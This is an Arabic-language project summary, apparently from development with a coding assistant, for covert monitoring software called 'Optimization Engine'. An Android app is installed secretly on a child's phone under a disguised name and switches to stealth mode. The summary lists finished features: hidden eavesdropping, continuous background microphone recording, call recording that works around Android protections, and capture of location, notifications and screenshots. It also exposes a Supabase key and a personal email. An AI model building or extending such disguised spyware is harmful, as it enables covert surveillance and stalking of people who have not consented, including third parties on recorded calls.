# 📋 ملخص مشروع Optimization-Engine
> **آخر تحديث:** 10 يوليو 2026 | **الإصدار الحالي:** v66 (لوحة التحكم: v9.3)

---

## 🎯 طبيعة المشروع

مشروع **المراقبة والتحكم عن بُعد** يتكون من:
- **تطبيق الابن (Android)** (`app/`) — يُثبَّت على هاتف الابن خفيةً، يُسمى "Optimization Engine"
- **تطبيق الكمبيوتر (Windows Service)** (`MyMonitorService/`) — يعمل في الخلفية كخدمة ويندوز لجمع معلومات الجهاز والبرامج المفتوحة.
- **لوحة التحكم (Web)** (`dashboard/`) — واجهة ويب مستضافة على Firebase ومصممة بشكل متجاوب بالكامل للموبايل والكمبيوتر، تدعم الأندرويد والويندوز.
- **تطبيق المشرف (Admin)** (`admin/`) — تطبيق أندرويد يعرض لوحة التحكم داخل WebView (معدّل لمنع التخزين المؤقت الكاش)

---

## 🏗️ المعمارية

```
هاتف الابن (Android)            جهاز الكمبيوتر (Windows Service)
    │                                    │
    │ موقع، مكالمات، إشعارات، لقطات...   │ معلومات النظام، الموارد، البرامج...
    ▼                                    ▼
Supabase (قاعدة البيانات + التخزين) ◄───┘
    │
    │ Realtime subscription
    ▼
لوحة التحكم (Firebase Hosting)
    │ يفتحها المشرف عبر
    ├── المتصفح: https://optimization-engine-238a4.web.app
    └── تطبيق Admin (WebView - بدون كاش)
```

---

## 🔑 بيانات الاتصال المهمة

| الخدمة | القيمة |
|--------|--------|
| **Firebase URL** | https://optimization-engine-238a4.web.app |
| **Firebase Project** | optimization-engine-238a4 |
| **Supabase URL** | https://kubowqqqawkgghxcktoe.supabase.co |
| **Supabase Anon Key** | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM` |
| **Supabase Storage Bucket** | `monitoring_data` |
| **Firebase Email** | lejik9677@gmail.com |
| **Java المستخدم** | `C:\Program Files\Android\Android Studio\jbr` |

---

## 📦 ملفات التثبيت والبرامج على Supabase Storage

| الملف | الغرض | الرابط |
|-------|--------|--------|
| `sync-service.apk` | تطبيق الابن لأندرويد (v55) | https://kubowqqqawkgghxcktoe.supabase.co/storage/v1/object/public/monitoring_data/sync-service.apk |
| `admin-app.apk` | تطبيق المشرف لأندرويد (محدث) | https://kubowqqqawkgghxcktoe.supabase.co/storage/v1/object/public/monitoring_data/admin-app.apk |
| `optimization-engine-windows-setup.exe` | تطبيق المراقبة للكمبيوتر (v1.0) | https://kubowqqqawkgghxcktoe.supabase.co/storage/v1/object/public/monitoring_data/optimization-engine-windows-setup.exe |

---

## 🗄️ جداول Supabase

| الجدول | الغرض | الحالة |
|--------|--------|--------|
| `remote_logs` | سجل أحداث التطبيق | ✅ يعمل بنجاح |
| `remote_settings` | إعدادات وتصنيف الأجهزة | ✅ يعمل بنجاح (تم إضافة عمود `device_type` لتمييز أندرويد/ويندوز) |
| `call_logs` | سجل المكالمات العادية والواتساب | ✅ أُنشئ ويعمل بنجاح |
| `notification_logs` | سجل الإشعارات | ✅ أُنشئ (SQL موجود) |
| `locations` | بيانات الموقع الجغرافي | ✅ يعمل بنجاح |

---

## 📁 الملفات الرئيسية

```
Optimization-Engine/
├── app/                          ← تطبيق الابن (Optimization Engine)
│   ├── build.gradle.kts          ← versionCode=65, versionName=1.65
│   └── src/main/
│       ├── res/values/strings.xml        ← اسم التطبيق: "Optimization Engine"
│       ├── res/values-ar/strings.xml     ← النسخة العربية
│       └── java/com/example/parentalcontrol/
│           ├── MainActivity.kt           ← واجهة إعداد الصلاحيات (مع التمويه)
│           ├── MonitoringForegroundService.kt ← الخدمة الرئيسية
│           ├── AppUpdateManager.kt       ← منطق التحديث (يتجاوز الكاش يدوياً)
│           ├── RemoteConfigManager.kt    ← جلب الإعدادات من Supabase
│           ├── CallLogTracker.kt         ← تتبع سجل المكالمات
│           └── AppNotificationListenerService.kt ← مراقبة الإشعارات
│
│── admin/                        ← تطبيق المشرف (WebView)
│   └── src/main/java/com/example/admin/MainActivity.kt
│       ← يفتح Firebase مع منع الكاش تماماً (LOAD_NO_CACHE)
│
├── dashboard/                    ← لوحة التحكم (Firebase Hosting)
│   ├── index.html                ← واجهة الويب (محدثة للنسخة v7.8 ودعم الأيقونات)
│   ├── fleet_logic.js            ← منطق جلب البيانات من Supabase (محدث للـ PC)
│   ├── downloads.html            ← صفحة التحميل (مضاف لها تطبيق الويندوز v1.0)
│   └── firebase.json             ← إعدادات Firebase (يتجاهل .apk)
│
├── MyMonitorService/             ← تطبيق مراقبة أجهزة الكمبيوتر (C# .NET 8.0)
│   ├── MyMonitorService.csproj   ← إعدادات المشروع وحزم WMI
│   ├── Program.cs                ← مضيف وإعدادات Windows Service
│   ├── Worker.cs                 ← المنطق الرئيسي وحلقة التكرار 30 ثانية
│   ├── install.bat               ← سكربت التثبيت التلقائي كمسؤول
│   └── uninstall.bat             ← سكربت إلغاء التثبيت النظيف
│
├── upload_apk.js                 ← سكريبت بناء ورفع APK إلى Supabase
├── firebase.json                 ← إعدادات Firebase الجذر
├── .firebaserc                   ← ربط Firebase بالمشروع
├── optimization-engine.jks       ← مفتاح توقيع (غير مستخدم حالياً، نستخدم debug.keystore)
├── setup_call_logs_table.sql     ← SQL لإنشاء جدول call_logs
└── setup_notification_logs_table.sql ← SQL لإنشاء جدول notification_logs
```

---

## 🔄 كيفية البناء والرفع

### بناء ورفع تطبيق الابن وتطبيق المشرف (v55 وما بعد):
```powershell
# 1. تهيئة مسار Java وبناء التطبيقات
$env:JAVA_HOME = "C:\Program Files\Android\Android Studio\jbr"
$env:PATH = "$env:JAVA_HOME\bin;$env:PATH"

# بناء تطبيق الابن
.\gradlew :app:assembleDebug --no-daemon

# بناء تطبيق المشرف
.\gradlew :admin:assembleDebug --no-daemon

# 2. الرفع إلى Supabase وتحديث قاعدة البيانات
node upload_apk.js
```

### نشر لوحة التحكم على Firebase:
```bash
firebase deploy --only hosting
```
> ⚠️ يجب تشغيله من المجلد الجذر `D:\Antigravity\Optimization-Engine`

---

## ✅ ما تم إنجازه (مؤخراً)

- [x] **فلترة التسجيلات الصوتية بالتاريخ والوقت وزيادة حدود الجلب (لوحة التحكم v9.3):**
  - إضافة واجهة فلاتر زمنية تفصيلية (`datetime-local`) في تبويب "التنصت المخفي" تتيح للمشرف تصفية التسجيلات الصوتية حسب وقت وتاريخ تسجيلها الفعلي (من / إلى).
  - زيادة الحد الأقصى لجلب ملفات التسجيلات الصوتية ولقطات الشاشة من Supabase Storage من 50 ملفاً إلى **1000 ملف** لحل مشكلة اختفاء تسجيلات الأمس نتيجة كثرة تسجيلات اليوم النشطة.
  - ترقية حد الجلب والتصفية في كود حذف الأجهزة (`deleteDevice`) إلى **1000 ملف** لضمان تنظيف كافة بيانات الجهاز بالكامل من الاستوديو ووحدة التخزين.
  - ترقية رقم إصدار السكربت في `index.html` إلى `v9.3` لتجاوز كاش المتصفح.

- [x] **تطوير ودمج تطبيق مراقبة أجهزة الكمبيوتر Windows Service (لوحة التحكم v7.8 / الخدمة v1.0):**
  - إنشاء تطبيق الخدمة بالكامل باستخدام C# .NET 8.0 ليعمل بالخلفية لجمع معلومات الجهاز (CPU, RAM, اسم الجهاز والمستخدم، والبرامج المفتوحة النشطة) وحفظها محلياً في `C:\ProgramData\MyMonitor\logs\`.
  - كتابة سكريبتات تثبيت وإلغاء تلقائية (`install.bat` / `uninstall.bat`) بطلب صلاحيات المسؤول تلقائياً.
  - إضافة عمود `device_type` في جدول `remote_settings` لفرز وتمييز الأجهزة.
  - تحديث لوحة التحكم لتمكين استعراض أجهزة الكمبيوتر ديناميكياً مع الأيقونة المخصصة 🖥️ مقابل 📱 للهواتف.
  - تحديث صفحة التحميلات [downloads.html](file:///D:/Antigravity/Optimization-Engine/dashboard/downloads.html) بإدراج كارد تحميل برنامج الويندوز وخطوات التثبيت السريعة ونشره بنجاح على Firebase.

- [x] **إلغاء خطوة تفعيل الحساب في معالج التثبيت (تطبيق الابن v65):**
  - تم تخطي مرحلة إدخال البريد الإلكتروني وكلمة المرور وقسم الأنشطة والرمز السري.
  - بمجرد إتمام منح الصلاحيات المطلوبة لهاتف الابن، يظهر مباشرة زر "تأكيد والبدء" في معالج التثبيت.
  - عند نقر الزر، ينتقل التطبيق فوراً إلى وضع التخفي وتفعيل الرصد الخلفي دون الحاجة لأي حساب.
- [x] **تشخيص وحل مشكلة "تعذر الاتصال بالسيرفر" عند تحديث التطبيق:**
  - تم تتبع سبب المشكلة وتبين أنها ناتجة عن عدم وجود عمودي `recording_enabled` و `capture_interval` في جدول `remote_settings` بقاعدة بيانات Supabase الخاصة بالمستخدم.
  - قمنا بتجهيز أمر SQL اللازم لإضافة الأعمدة وحل المشكلة بشكل جذري.
- [x] **تفعيل وضع التكرار التلقائي للميكروفون في الخلفية (تطبيق الابن v64 / لوحة التحكم v7.7):**
  - نقل منطق التكرار التلقائي (Auto-Record) للميكروفون من تشغيل متصفح الويب المحلي (`setTimeout`) ليعمل مباشرة **في الخلفية على الهاتف البعيد** بشكل دائم ومستمر.
  - يتم حفظ حالته والفاصل الزمني في جدول `remote_settings` بقاعدة البيانات، ويتم إرسال أمر فوري للهاتف لبدء حلقة التسجيل الدورية في الخدمة الخلفية (`MonitoringForegroundService`).
  - يبقى التسجيل التلقائي نشطاً ومستمراً حتى لو قام المشرف بإغلاق لوحة التحكم أو المتصفح، ولا يتوقف إلا عند إيقافه يدوياً من لوحة التحكم.
- [x] **إصلاح تسجيلات المكالمات (تطبيق الابن v63):**
  - تقديم `VOICE_COMMUNICATION` كأول خيار في سلسلة مصادر الصوت المخصصة للمكالمات بدلاً من وضعها بعد `VOICE_RECOGNITION` و `MIC`.
  - هذا التغيير يحل مشكلة التسجيلات الصامتة للمكالمات على هواتف أندرويد 10+، لأن مصادر الميكروفون العادية لا ترمي استثناءً ولكن يتم حظر بثها الصوتي وتصبح صامتة أثناء المكالمة النشطة.
- [x] **تحسين أمان وحماية لوحة التحكم (لوحة التحكم v7.6):**
  - تطبيق آلية **التأكيد الثنائي المتتالي (Double Confirm)** لتأكيد حذف التسجيلات المتعددة لتفادي مسحها بالخطأ دون الحاجة لكتابة أي كلمة تأكيد.
  - إبعاد زر **"حذف المحدد"** عن زر **"استماع للمحدد"** بزيادة الهامش البيني ليكون (`gap-6`) لحماية لوحة التحكم من نقرات الأصابع العشوائية على الهواتف.
  - ترقية رقم إصدار السكربت إلى `v7.6` لتجاوز كاش المتصفح وتأمين تشغيل الكود الجديد مباشرة.
- [x] **إصلاحات وتحسينات جذرية (v58):**
  - **إصلاح التسجيلات الصامتة للمكالمات:** إعطاء الأولوية لمصدر الصوت `MIC` العادي لمنع قيود وحظر أندرويد 10+ لتسجيلات الخلفية.
  - **مزامنة سجل المكالمات المحدث:** رفع نطاق المزامنة المبدئي لـ 30 يوماً واستخدام `upsert` لمنع تعارضات البيانات، وتفعيل المزامنة فور إعطاء الأذونات دون انتظار.
  - **حل تعطل الخريطة:** تصفية واستبعاد قيم إحداثيات `NaN` أو `null` تماماً في لوحة التحكم وتحديث المؤشرات والوجهات بنقاط نظيفة لمنع أخطاء Leaflet LatLng.
- [x] **إعادة تصميم واجهة الموبايل بالكامل (v6.7):**
  - إضافة قائمة منسدلة للأجهزة (`#mobile-device-dropdown`) في الهيدر العلوي ومزامنتها ثنائية الاتجاه مع القائمة الجانبية.
  - نقل كافة تبويبات لوحة التحكم لداخل القائمة الجانبية المنزلقة للموبايل مع خاصية الإغلاق التلقائي بمجرد الاختيار.
  - إضافة شريط الإجراءات السريعة بأسفل الشاشة على الهواتف للوصول الفوري (التقاط، موقع، تشغيل، ميك، خروج).
  - تحسين مساحات اللمس والتجاوب لراحة المستخدم.
- [x] **تخطي أخطاء OSRM 400 في التتبع:** إضافة تحقق ذكي يتجنب استدعاء OSRM snapped roads في حال تقارب النقاط الشديد أو قلتها لتقليل الأخطاء في سجل المتصفح.
- [x] **ميزة حذف الجهاز وإزالة التسجيلات المتعددة:**
  - إمكانية حذف جهاز بالكامل من لوحة التحكم ومسح جميع ملفاته من الاستوديو/التخزين بـ Supabase.
  - دعم تحديد وحذف تسجيلات صوتية متعددة دفعة واحدة من تبويب "التنصت المخفي" لتبسيط الإدارة.
- [x] **إضافة أمر UNINSTALL عن بُعد للهاتف:** تعبئة أمر الحظر وإلغاء تثبيت التطبيق عن بُعد من لوحة التحكم متضمناً إلغاء صلاحيات Device Admin برمجياً.
- [x] **إضافة أمر RESTART عن بُعد (v56):** إضافة معالج أمر `RESTART` في `RealtimeCommandManager.kt` الذي يرسل broadcast إلى `ServiceRestartReceiver` لإعادة تشغيل `MonitoringForegroundService` عند توقفها. تم تصحيح `upload_apk.js` ليعكس الإصدار الصحيح (56) في قاعدة البيانات.
- [x] **إصلاح التسجيل الصوتي وصوت المكالمات:** تعديل أولوية مصادر الميكروفون إلى `MIC` و `VOICE_COMMUNICATION` ليعمل بنجاح مع تسجيل الصوت للمكالمات وتخطي قيود أندرويد 10+، مع رفع جودة الصوت وحل مشكلة الصوت الصامت في التسجيلات.
- [x] **تحسين واجهة التسجيلات (Audio Vault):** إعادة تصميم عرض التسجيلات في لوحة التحكم بشكل كامل لفصل تسجيلات المكالمات (Call Recordings) عن تسجيلات الاستماع المحيطي (Remote Mic) مع إمكانية الفلترة وتنسيق الوقت والتاريخ تلقائياً من اسم الملف وعرض الحجم والمدة التقديرية.
- [x] **تحديث وبناء تطبيق المشرف (Admin APK):** بناء نسخة تطبيق المشرف الأحدث بحجم (5.3 MB) بعد معالجة مشكلة التحديث التلقائي ومزامنتها مع أذونات الميكروفون والتخزين، ورفعهما (مع تطبيق الابن v55) إلى Supabase Storage.
- [x] **تحديث صفحة التحميل ونشرها على Firebase:** إعادة تصميم صفحة `downloads.html` لتشمل رمزي استجابة سريعة (QR Codes) منفصلين لتطبيق الابن وتطبيق المشرف مع تفاصيل الميزات وتحميل فوري.
- [x] **منع كاش تطبيق الأدمن:** تعديل WebView في تطبيق المشرف لمنع التخزين المؤقت تماماً ليعرض التحديثات مباشرة من السيرفر.

---

## ⚠️ مشاكل معروفة / ما يحتاج متابعة

| المشكلة | الحالة | الحل |
|---------|--------|------|
| تعارض الحزم عند التحديث | ✅ تم الحل | قام المستخدم بحذف التطبيق القديم وتثبيت v55 الجديد من الـ QR Code مباشرة، وستعمل التحديثات المستقبلية تلقائياً. |
| تسجيلات المكالمة بدون صوت | ✅ تم الحل | تم استخدام `VOICE_COMMUNICATION` بدلاً من المصدر الافتراضي لضمان التقاط الصوت بنجاح في كلا الطرفين. |
| انقطاع تشغيل الصوت بسبب التحديث التلقائي | ✅ تم الحل | تم تعديل منطق الجلب التلقائي (auto-refresh) ليتوقف تماماً في حال وجود ملف صوتي قيد التشغيل النشط. |
| تفاعل الهاتف البعيد | ⏳ قيد المتابعة | التأكد من أن الهاتف البعيد استقبل التحديث بنجاح. |
| تفعيل Screen Capture | ⏳ قيد المتابعة | يتطلب ضغط زر "تفعيل" يدوياً على هواتف الأبناء. |
